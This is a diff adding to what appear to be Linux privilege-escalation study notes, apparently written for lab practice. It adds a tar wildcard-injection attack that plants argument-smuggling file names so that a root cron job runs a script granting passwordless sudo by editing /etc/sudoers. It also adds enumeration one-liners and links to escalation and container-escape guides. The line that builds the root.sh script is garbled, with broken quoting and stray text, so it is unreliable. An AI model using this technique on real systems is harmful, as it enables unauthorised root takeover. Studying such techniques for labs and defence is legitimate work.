@@ -233,6 +233,56 @@ Linux VM
 8. In command prompt type: ``/tmp/x``
 9. In command prompt type: ``id``
 
+### Wildcard abuse:
+A wildcard character can be used as a replacement for other characters and are interpreted by the shell before other actions. Examples of wild cards include:
+
+| **Character** | **Significance**                                                                                                                                      |
+| ------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `*`           | An asterisk that can match any number of characters in a file name.                                                                                   |
+| `?`           | Matches a single character.                                                                                                                           |
+| `[ ]`         | Brackets enclose characters and can match any single one at the defined position.                                                                     |
+| `~`           | A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory. |
+| `-`           | A hyphen within brackets will denote a range of characters.                                                                                           |
+|               |                                                                                                                                                       |
+|               |                                                                                                                                                       |
+|               |                                                                                                                                                       |
+Example with Tar:
+```shell-session
+# let's assume there is some cron:
+ */01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
+# we need to create script: 
+ echo 'echo " echo "" > "--checkpoint-action=exec=sh root.sh"htb-student ALL=(root)   NOPASSWD: ALL" >> /etc/sudoers' > root.sh
+ # create files:
+ echo "" > "--checkpoint-action=exec=sh root.sh"
+ echo "" > --checkpoint=1
+ # after cron will execute:
+ sudo -l 
+ #  (root) NOPASSWD: ALL
+ 
+```
+### Useful commands
+
+```shell-session
+# enumerating processes
+find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
+
+# enumerating installed packages
+apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
+
+# sudo version
+sudo -v
+
+# enumerating binaries
+ls -l /bin /usr/bin/ /usr/sbin/
+
+# binaries we should investigate according to Gtfobins.io
+for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
+
+# strace - to follow the flow :) - can be used with other binaries:
+strace ping -c1 10.129.112.20
+
+```
+
 
 ### Useful resources
 PayloadAllTheThings - Methodology and Resources:
@@ -241,6 +291,10 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20an
 some privilege escalation techniques described:
 https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html
 https://payatu.com/blog/a-guide-to-linux-privilege-escalation/
+https://medium.verylazytech.com/privilege-escalation-matters-12-chains-leading-to-full-takeover-step-by-step-guide-7ec70cb0b8ef
+
+escaping from docker container - tools:
+https://medium.com/@kankojoseph/from-containers-to-host-privilege-escalation-techniques-in-docker-487fe2124b8e
 
 Checklist:
 https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md
